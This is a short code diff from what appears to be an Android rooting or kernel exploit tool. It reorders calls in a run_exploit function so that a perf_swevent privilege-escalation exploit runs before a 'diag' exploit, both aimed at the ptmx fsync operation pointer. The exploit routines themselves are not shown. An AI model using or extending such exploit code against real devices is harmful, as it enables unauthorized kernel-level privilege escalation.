@@ -194,13 +194,18 @@ run_exploit(void)
 
   ptmx_fsync_address = ptmx_fops_address + 0x38;
 
+  printf("Attempt perf_swevent exploit...\n");
+  if (perf_swevent_run_exploit(ptmx_fsync_address, (int)&install_mmap,
+                                  run_install_mmap, (void *)ptmx_fops_address)) {
+    return true;
+  }
+
+  printf("Attempt diag exploit...\n");
   if (attempt_diag_exploit(ptmx_fsync_address, (void *)ptmx_fops_address)) {
     return true;
   }
 
-  printf("\nAttempt perf_swevent exploit...\n");
-  return perf_swevent_run_exploit(ptmx_fsync_address, (int)&install_mmap,
-                                  run_install_mmap, (void *)ptmx_fops_address);
+  return false;
 }
 
 static bool
